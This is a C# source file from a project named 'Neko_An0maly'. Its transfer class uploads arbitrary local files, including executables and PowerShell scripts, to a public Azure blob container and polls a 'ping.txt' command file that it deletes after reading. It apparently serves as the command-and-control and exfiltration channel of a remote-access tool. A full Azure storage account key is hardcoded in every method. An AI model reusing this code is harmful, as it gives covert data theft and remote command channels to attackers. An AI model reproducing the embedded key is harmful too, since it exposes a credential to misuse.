using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;
using System.Threading;

namespace Neko_An0maly.CORE
{
    public class TransferProtocol
    {
        public static void delete(string filedel, string ext)
        {
            string file_extension,
            storageAccount_connectionString;
            string azure_ContainerName = "ftp";

            storageAccount_connectionString = "DefaultEndpointsProtocol=https;AccountName=previewps;AccountKey=Io326GO+TGJpd8yBh1LzSDDRc6vdWV81O6Ntkc/SJOYHe4NA6IlxUOPrJjycEM8uAEWZu2XkZ5LUDTymfRGIsw==;EndpointSuffix=core.windows.net"; ;

            CloudStorageAccount mycloudStorageAccount = CloudStorageAccount.Parse(storageAccount_connectionString);
            CloudBlobClient blobClient = mycloudStorageAccount.CreateCloudBlobClient();
            CloudBlobContainer container = blobClient.GetContainerReference(azure_ContainerName);

            if (container.CreateIfNotExists())
            {
                container.SetPermissionsAsync(new BlobContainerPermissions
                {
                    PublicAccess =
                  BlobContainerPublicAccessType.Blob
                });

            }

            CloudBlockBlob cloudBlockBlob = container.GetBlockBlobReference(filedel);

            switch (ext)
            {
                case "exe":
                    file_extension = ".exe";
                    cloudBlockBlob.Properties.ContentType = file_extension;

                    cloudBlockBlob.DeleteIfExists();

                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("File deleted from cloud.");
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
                case "ps1":
                    file_extension = ".ps1";
                    cloudBlockBlob.Properties.ContentType = file_extension;

                    cloudBlockBlob.DeleteIfExists();

                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("File deleted from cloud.");
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
                case "png":
                    file_extension = ".png";
                    cloudBlockBlob.Properties.ContentType = file_extension;

                    cloudBlockBlob.DeleteIfExists();

                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("File deleted from cloud.");
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
                case "txt":
                    file_extension = ".txt";
                    cloudBlockBlob.Properties.ContentType = file_extension;

                    cloudBlockBlob.DeleteIfExists();

                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("File deleted from cloud.");
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("This type of extention is currently not supported!");
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
            }
        }

        public static void uploadData(string fileToUpload)
        {
            string file_extension,
            filename_withExtension,
            storageAccount_connectionString;
            Stream file;
            string azure_ContainerName = "ftp";

            storageAccount_connectionString = "DefaultEndpointsProtocol=https;AccountName=previewps;AccountKey=Io326GO+TGJpd8yBh1LzSDDRc6vdWV81O6Ntkc/SJOYHe4NA6IlxUOPrJjycEM8uAEWZu2XkZ5LUDTymfRGIsw==;EndpointSuffix=core.windows.net"; ;

            file = new FileStream(fileToUpload, FileMode.Open);

            CloudStorageAccount mycloudStorageAccount = CloudStorageAccount.Parse(storageAccount_connectionString);
            CloudBlobClient blobClient = mycloudStorageAccount.CreateCloudBlobClient();
            CloudBlobContainer container = blobClient.GetContainerReference(azure_ContainerName);

            if (container.CreateIfNotExists())
            {

                container.SetPermissionsAsync(new BlobContainerPermissions
                {
                    PublicAccess =
                  BlobContainerPublicAccessType.Blob
                });

            }

            file_extension = Path.GetExtension(fileToUpload);
            filename_withExtension = Path.GetFileName(fileToUpload);

            CloudBlockBlob cloudBlockBlob = container.GetBlockBlobReference(filename_withExtension);
            cloudBlockBlob.Properties.ContentType = file_extension;

            cloudBlockBlob.UploadFromStreamAsync(file);

            Console.WriteLine("Upload Completed.");
            Console.WriteLine("Thread sleeping for 6s.");

            Thread.Sleep(6000);

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("File won't be deleted itself!");
            Console.ForegroundColor = ConsoleColor.White;
            file.Dispose();
        }

        public static void upload(string fileToUpload)
        {
            string file_extension,
            filename_withExtension,
            storageAccount_connectionString;
            Stream file;
            string azure_ContainerName = "ftp";

            storageAccount_connectionString = "DefaultEndpointsProtocol=https;AccountName=previewps;AccountKey=Io326GO+TGJpd8yBh1LzSDDRc6vdWV81O6Ntkc/SJOYHe4NA6IlxUOPrJjycEM8uAEWZu2XkZ5LUDTymfRGIsw==;EndpointSuffix=core.windows.net"; ;

            file = new FileStream(fileToUpload, FileMode.Open);

            CloudStorageAccount mycloudStorageAccount = CloudStorageAccount.Parse(storageAccount_connectionString);
            CloudBlobClient blobClient = mycloudStorageAccount.CreateCloudBlobClient();
            CloudBlobContainer container = blobClient.GetContainerReference(azure_ContainerName);

            if (container.CreateIfNotExists())
            {

                container.SetPermissionsAsync(new BlobContainerPermissions
                {
                    PublicAccess =
                  BlobContainerPublicAccessType.Blob
                });

            }

            file_extension = Path.GetExtension(fileToUpload);
            filename_withExtension = Path.GetFileName(fileToUpload);

            CloudBlockBlob cloudBlockBlob = container.GetBlockBlobReference(filename_withExtension);
            cloudBlockBlob.Properties.ContentType = file_extension;

            cloudBlockBlob.UploadFromStreamAsync(file);

            Console.WriteLine("Upload Completed.");
            Console.WriteLine("Thread sleeping for 6s.");

            Thread.Sleep(6000);

            Console.WriteLine("Deleting command to prevent looping.");
            cloudBlockBlob.DeleteIfExists();
            file.Dispose();
        }
        public static void download(string downloadLocation)
        {
            string filetoDownload = "ping.txt";
            string azure_ContainerName = "data";

            string storageAccount_connectionString = "DefaultEndpointsProtocol=https;AccountName=previewps;AccountKey=Io326GO+TGJpd8yBh1LzSDDRc6vdWV81O6Ntkc/SJOYHe4NA6IlxUOPrJjycEM8uAEWZu2XkZ5LUDTymfRGIsw==;EndpointSuffix=core.windows.net";

            CloudStorageAccount mycloudStorageAccount = CloudStorageAccount.Parse(storageAccount_connectionString);
            CloudBlobClient blobClient = mycloudStorageAccount.CreateCloudBlobClient();

            CloudBlobContainer container = blobClient.GetContainerReference(azure_ContainerName);
            CloudBlockBlob cloudBlockBlob = container.GetBlockBlobReference(filetoDownload);

            if (cloudBlockBlob.Exists())
            {
                Stream file = File.OpenWrite(downloadLocation + filetoDownload);
                cloudBlockBlob.DownloadToStream(file);
                cloudBlockBlob.DeleteIfExists();
                file.Dispose();
            }
        }


    }
}
